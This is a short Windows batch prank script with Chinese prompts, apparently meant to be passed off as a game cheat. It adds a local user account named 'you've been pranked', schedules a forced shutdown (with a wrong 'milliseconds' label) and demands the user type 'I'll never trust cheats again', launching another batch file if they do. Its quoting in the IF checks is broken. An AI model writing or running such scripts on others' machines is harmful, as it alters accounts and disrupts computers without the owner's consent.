net user 你被整了 /add
@echo off
shutdown /s -t 2090 -c "在2090毫秒后关机"
echo 快说“我再也不相信外挂了”，不然就关闭%COMPUTERNAME%
set papy=就不说
set /p papy=乖乖说:
IF \"%papy%\"==我再也不相信外挂了\"\" start Bash.bat
IF NOT \"%papy%\"==我再也不相信外挂了\"\" echo %papy%
